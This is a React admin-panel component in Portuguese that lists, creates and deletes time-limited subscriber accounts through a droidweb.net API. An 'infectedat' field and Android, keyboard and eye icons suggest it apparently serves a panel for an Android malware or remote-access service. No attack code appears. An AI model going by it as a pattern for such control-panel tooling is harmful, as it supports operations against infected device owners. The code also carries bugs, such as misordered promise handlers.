import { format } from "date-fns";
import toast from "react-hot-toast";
import PropTypes from "prop-types";
import ArrowRightIcon from "@heroicons/react/24/solid/ArrowRightIcon";
import {
  ImAccessibility,
  ImAndroid,
  ImMagicWand,
  ImKeyboard,
  ImHammer,
  ImPhone,
  ImEyePlus,
  ImMobile2,
  ImCross,
  ImEye,
} from "react-icons/im";
import { FaP, FaPix } from "react-icons/fa6";
import { RiMessageFill } from "react-icons/ri";
import { Modal } from "pretty-modal";
import {
  Box,
  Button,
  Card,
  CardActions,
  CardHeader,
  Divider,
  SvgIcon,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TextField,
  TableRow,
} from "@mui/material";
import { Scrollbar } from "src/components/scrollbar";
import { SeverityPill } from "src/components/severity-pill";
import { AuthContext } from "src/contexts/auth-context";
import { useContext, useState, useEffect } from "react";
import jsCookie from "js-cookie";

const statusMap = {
  pending: "warning",
  delivered: "success",
  refunded: "error",
};

export const OverviewAllCustomerss = (props) => {
  const { user } = useContext(AuthContext);
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState(null);
  var token = jsCookie.get("token");

  useEffect(() => {
    if (!user?.is_admin) return;

    updateData();
  }, []);

  function updateData() {
    setLoading(true);

    fetch("https://api.droidweb.net/admin/data", {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer " + token,
      },
    })
      .catch(() => {
        toast.error("Erro ao conectar com o servidor!");
        setLoading(false);
      })
      .then((res) => res.json())
      .then((res) => {
        console.log(res);
        if (res.status == "error") {
          toast.error(res.message);
          setLoading(false);
        } else if (res?.status == "success" && res?.data) {
          setData(res.data);
          setLoading(false);
        }
      });
  }

  function handlerDeleteUser(e, id) {
    e.preventDefault();

    setLoading(true);

    fetch("https://api.droidweb.net/user/delete", {
      method: "DELETE",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer " + token,
      },
      body: JSON.stringify({
        id: id,
      }),
    })
      .catch((_) => {
        toast.error("Erro ao conectar com o servidor!");
        setLoading(false);
      })
      .then((res) => res.json())
      .then((res) => {
        if (res.status == "error") {
          toast.error(res.message);
          setLoading(false);
        } else if (res?.status == "success") {
          toast.success("Usuário deletado com sucesso!");
          updateData();
        }
      });
  }

  function handlerCreateUser(e) {
    e.preventDefault();

    setLoading(true);

    const select = document.getElementById("acesso");
    const senha = document.getElementById("senha").value;
    const usuario = document.getElementById("usuario").value;
    let expirationAt = Date.now() / 1000;

    switch (select.options[select.selectedIndex].value) {
      case "1semana":
        expirationAt += 7 * 24 * 60 * 60;
        break;
      case "1mes":
        expirationAt += 30 * 24 * 60 * 60;
        break;
    }

    if (usuario === "" || senha === "") {
      toast.error("Preencha todos os campos!");
      setLoading(false);
      return;
    }

    if (usuario.length < 3 || senha.length < 3) {
      toast.error("Usuário ou senha inválidos!");
      setLoading(false);
      return;
    }

    fetch("https://api.droidweb.net/user/create", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer " + token,
      },
      body: JSON.stringify({
        name: usuario,
        password: senha,
        expires_at: Math.round(expirationAt),
      }),
    })
      .catch((_) => {
        toast.error("Erro ao conectar com o servidor!");
        setLoading(false);
      })
      .then((res) => res.json())
      .then((res) => {
        if (res.status == "error") {
          toast.error(res.message);
          setLoading(false);
        } else if (res?.status == "success") {
          toast.success("Usuário criado com sucesso!");
          updateData();
          setLoading(false);
        } else {
          toast.error("Erro ao criar usuário!");
          setLoading(false);
        }
      });
  }
  return (
    <Card>
      <Scrollbar>
        <Box sx={{ minWidth: 800 }}>
          <Table>
            <TableHead>
              <TableRow>
                <TableCell padding="checkbox">Usuário</TableCell>
                <TableCell>ID</TableCell>
                <TableCell sortDirection="desc">Dia de Criação</TableCell>
                <TableCell>Dia de Expiração</TableCell>
                <TableCell></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {data &&
                data.users.map((user, i) => {
                  let infectedAttt;
                  try {
                    infectedAttt = user.infectedat
                      ? format(user.infectedat, "dd/MM/yyyy")
                      : "Data Unknown";
                  } catch (error) {}

                  return (
                    <TableRow hover key={user.id}>
                      <TableCell>
                        <img
                          alt=""
                          src="https://images-platform.99static.com/uacu1ujT99RBPkVCJn3qCzU_8aQ=/500x500/top/smart/99designs-contests-attachments/20/20691/attachment_20691238"
                          style={{ borderRadius: "50%", width: "0px" }} // Apply the inline style directly
                        />
                        {user.name}
                      </TableCell>
                      <TableCell>{user.id}</TableCell>
                      <TableCell>
                        {new Date(user.createdAt * 1000).toLocaleDateString("pt-BR")}
                      </TableCell>
                      <TableCell>
                        {new Date(user.expirationAt * 1000).toLocaleDateString("pt-BR")}
                      </TableCell>
                      <TableCell>
                        <a
                          onClick={(e) => handlerDeleteUser(e, user.id)}
                          className={
                            !user.isAdmin
                              ? loading
                                ? "btn btn-danger btn-sm dropdown disabled"
                                : "btn btn-danger btn-sm dropdown"
                              : "btn btn-danger btn-sm dropdown disabled"
                          }
                          type="button"
                          data-bs-toggle="dropdown"
                          aria-expanded="false"
                        >
                          <SvgIcon width="100px">
                            <ImCross color="red" />
                          </SvgIcon>
                        </a>
                        <a
                          onClick={(e) => {
                            // Add your logic here
                            // Example: handlerEyeClick(e, user.id);
                          }}
                          className={
                            !user.isAdmin
                              ? loading
                                ? "btn btn-danger btn-sm dropdown disabled"
                                : "btn btn-danger btn-sm dropdown"
                              : "btn btn-danger btn-sm dropdown disabled"
                          }
                          type="button"
                          data-bs-toggle="dropdown"
                          aria-expanded="false"
                        >
                          <SvgIcon width="100px">
                            <ImEye color="white" />
                          </SvgIcon>
                        </a>
                      </TableCell>
                    </TableRow>
                  );
                })}
            </TableBody>
          </Table>
        </Box>
      </Scrollbar>
      <Divider />
      <CardActions sx={{ justifyContent: "flex-end" }}>
        <Button
          color="inherit"
          endicon={
            <SvgIcon fontSize="small">
              <ArrowRightIcon />
            </SvgIcon>
          }
          size="small"
          variant="text"
        >
          View all
        </Button>
      </CardActions>
    </Card>
  );
};

OverviewAllCustomerss.prototype = {
  orders: PropTypes.array,
  sx: PropTypes.object,
};
